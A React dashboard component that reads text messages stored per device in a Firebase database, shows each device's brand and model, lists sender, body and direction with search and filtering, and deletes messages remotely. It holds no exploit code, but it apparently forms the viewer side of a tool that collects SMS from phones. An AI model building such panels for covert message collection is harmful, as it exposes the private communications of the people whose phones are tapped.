import { useState, useEffect } from 'react'
import { motion } from 'framer-motion'
import { Link } from 'react-router-dom'
import { MessageSquare, Search, Filter, MoreVertical, Trash2, Eye, Copy, AlertTriangle, ChevronRight, Reply, Download, Archive } from 'lucide-react'
import { db } from '../context/AuthContext'
import { ref, onValue, off, get, remove } from 'firebase/database'
import { toast } from 'sonner'

export default function Messages() {
  const [messages, setMessages] = useState([])
  const [loading, setLoading] = useState(true)
  const [search, setSearch] = useState('')
  const [filter, setFilter] = useState('all')
  const [selectedIds, setSelectedIds] = useState(new Set())
  const [expandedId, setExpandedId] = useState(null)

  useEffect(() => {
    if (!db) { setLoading(false); return }
    const usersRef = ref(db, 'users')
    const unsub = onValue(usersRef, (snapshot) => {
      const data = snapshot.val() || {}
      const allMessages = []
      Object.entries(data).forEach(([deviceId, device]) => {
        if (device.messages) {
          Object.entries(device.messages).forEach(([msgId, msg]) => {
            allMessages.push({
              id: `${deviceId}_${msgId}`,
              deviceId,
              deviceName: `${device.brand} ${device.model}`,
              ...msg,
              timestamp_formatted: msg.timestamp ? new Date(msg.timestamp).toLocaleString() : 'Unknown'
            })
          })
        }
      })
      allMessages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))
      setMessages(allMessages)
      setLoading(false)
    })
    return () => off(usersRef, 'value', unsub)
  }, [])

  const filteredMessages = messages.filter(msg => {
    const matchesSearch = msg.address?.toLowerCase().includes(search.toLowerCase()) ||
      msg.body?.toLowerCase().includes(search.toLowerCase()) ||
      msg.deviceName?.toLowerCase().includes(search.toLowerCase())
    const matchesFilter = filter === 'all' || (filter === 'incoming' && msg.type === 'incoming') || (filter === 'outgoing' && msg.type === 'outgoing')
    return matchesSearch && matchesFilter
  })

  const toggleSelect = (id) => {
    setSelectedIds(prev => { const next = new Set(prev); next.has(id) ? next.delete(id) : next.add(id); return next })
  }

  const handleDelete = async (id) => {
    if (!confirm('Delete this message?')) return
    const [deviceId, msgId] = id.split('_')
    try { await remove(ref(db, `users/${deviceId}/messages/${msgId}`)); toast.success('Message deleted') }
    catch (err) { toast.error('Failed to delete message') }
  }

  if (loading) {
    return <div className="p-5 space-y-4"><div className="h-12 bg-secondary/50 rounded-xl animate-pulse" />{[...Array(5)].map((_, i) => <div key={i} className="h-20 bg-secondary/50 rounded-xl animate-pulse" />)}</div>
  }

  return (
    <div className="p-5 space-y-6">
      <div className="flex items-center justify-between">
        <div><h1 className="text-2xl font-black text-foreground">Messages</h1><p className="text-sm text-muted-foreground mt-1">{messages.length} total messages</p></div>
      </div>
      <div className="flex flex-col sm:flex-row gap-4">
        <div className="relative flex-1"><Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" /><input type="text" placeholder="Search messages..." value={search} onChange={(e) => setSearch(e.target.value)} className="w-full pl-10 pr-4 py-2.5 rounded-xl bg-secondary/50 border border-border focus:outline-none focus:ring-2 focus:ring-primary/20" /></div>
        <select value={filter} onChange={(e) => setFilter(e.target.value)} className="px-4 py-2.5 rounded-xl bg-secondary/50 border border-border focus:outline-none focus:ring-2 focus:ring-primary/20"><option value="all">All Messages</option><option value="incoming">Incoming</option><option value="outgoing">Outgoing</option></select>
      </div>
      <div className="rounded-2xl border border-border bg-card overflow-hidden">
        <div className="divide-y divide-border/50">
          {filteredMessages.length === 0 ? <div className="p-10 text-center"><MessageSquare className="h-12 w-12 text-muted-foreground/50 mx-auto mb-3" /><p className="text-muted-foreground">No messages found</p></div> : filteredMessages.map((msg) => {
            const isExpanded = expandedId === msg.id
            return <motion.div key={msg.id} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}><div className="p-4 hover:bg-secondary/30 transition-colors"><div className="flex items-start gap-4"><div className="flex-1 min-w-0"><div className="flex items-center gap-2"><span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold ${msg.type === 'incoming' ? 'bg-blue-500/10 text-blue-500' : 'bg-green-500/10 text-green-500'}`}><MessageSquare className="h-3 w-3" />{msg.type === 'incoming' ? 'Incoming' : 'Outgoing'}</span><span className="text-[11px] text-muted-foreground font-mono">{msg.timestamp_formatted}</span><span className="font-semibold text-foreground truncate max-w-[200px]">{msg.deviceName}</span></div><div className="flex items-center gap-2 mt-1"><span className="text-[11px] text-muted-foreground">From:</span><span className="font-mono text-foreground">{msg.address}</span></div><p className="mt-2 text-sm text-foreground break-all">{msg.body}</p></div><div className="flex items-center gap-2"><button onClick={() => setExpandedId(isExpanded ? null : msg.id)} className="p-2 rounded-lg hover:bg-secondary text-muted-foreground hover:text-foreground transition-colors"><ChevronRight className={`h-4 w-4 transition-transform ${isExpanded ? 'rotate-90' : ''}`} /></button><button onClick={() => handleDelete(msg.id)} className="p-2 rounded-lg hover:bg-destructive/10 text-muted-foreground hover:text-destructive transition-colors"><Trash2 className="h-4 w-4" /></button></div></div>{isExpanded && <div className="px-4 pb-4 border-t border-border/50 mt-2"><div className="flex items-center gap-2 text-[11px] text-muted-foreground"><span>ID:</span><span className="font-mono truncate max-w-[300px]">{msg.id}</span><button onClick={() => navigator.clipboard.writeText(msg.id)} className="ml-2 p-1 rounded hover:bg-secondary"><Copy className="h-3 w-3" /></button></div></div>}</motion.div>
          })}
        </div>
      </div>
    </div>
  )
}